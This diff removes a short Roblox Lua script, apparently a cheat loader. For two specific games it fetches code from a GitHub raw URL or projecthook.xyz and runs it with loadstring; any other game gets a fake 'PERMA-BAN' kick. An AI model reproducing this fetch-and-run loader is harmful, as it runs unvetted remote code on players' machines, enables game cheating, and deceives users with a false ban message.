@@ -1,7 +1,0 @@
-if game.PlaceId == 2788229376 then -- Da hood
- loadstring(game:HttpGet('https://raw.githubusercontent.com/Exostess/Exostwes/main/Acron.txt'))()
-    elseif game.PlaceId == 4282985734 then --CombatWarriors
-    loadstring(game:HttpGet("https://projecthook.xyz/scripts/new-free.lua"))()
-    else
-        game.Players.LocalPlayer:kick("PERMA-BAN")
-        end
